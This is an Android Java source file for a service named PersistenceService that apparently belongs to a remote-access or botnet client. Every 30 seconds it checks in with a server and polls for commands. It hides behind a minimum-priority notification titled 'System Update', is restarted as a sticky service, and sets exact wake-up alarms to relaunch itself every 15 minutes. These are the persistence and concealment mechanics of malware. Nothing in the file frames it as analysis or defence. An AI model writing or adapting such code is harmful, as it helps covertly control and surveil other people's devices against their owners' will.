package com.nexus.client;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.SystemClock;
import androidx.core.app.NotificationCompat;

public class PersistenceService extends Service {
    private HandlerThread handlerThread;
    private Handler backgroundHandler;
    private static final long INTERVAL_MS = 30000; // 30 segundos

    private final Runnable heartbeat = new Runnable() {
        @Override
        public void run() {
            NetworkManager.checkIn();
            NetworkManager.pollCommands();
            backgroundHandler.postDelayed(this, INTERVAL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        handlerThread = new HandlerThread("NexusHeartbeat");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = "nexus_core";
            NotificationChannel channel = new NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new NotificationCompat.Builder(this, channelId)
                    .setContentTitle("System Update")
                    .setContentText("Running in background...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setOngoing(true)
                    .build();
            
            startForeground(1, notification);
        }

        backgroundHandler.removeCallbacks(heartbeat);
        backgroundHandler.post(heartbeat);

        scheduleRestart();

        return START_STICKY;
    }

    private void scheduleRestart() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent restartIntent = new Intent(this, PersistenceService.class);
        
        int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
        }
        
        PendingIntent pendingIntent = PendingIntent.getService(this, 1, restartIntent, pendingFlags);

        long triggerAtMillis = SystemClock.elapsedRealtime() + (15 * 60 * 1000); // 15 min
        
        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
            } else {
                alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
            }
        }
    }

    @Override
    public void onDestroy() {
        backgroundHandler.removeCallbacks(heartbeat);
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}